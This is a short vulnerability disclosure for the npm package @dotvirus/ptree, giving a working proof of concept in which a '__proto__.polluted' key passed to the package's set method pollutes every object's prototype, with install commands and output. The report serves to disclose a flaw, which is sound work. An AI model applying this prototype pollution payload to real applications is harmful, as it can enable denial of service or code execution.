# Description

`@dotvirus/ptree` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:
```javascript
// poc.js
const ptree = require('@dotvirus/ptree').default

console.log('Before: ' + {}.polluted)
const tree = new ptree({})
tree.set('__proto__.polluted', true)
console.log('After: ' + {}.polluted)
```
2. Execute the following commands in the terminal:
```bash
npm i @dotvirus/ptree # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: undefined
After: true
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.
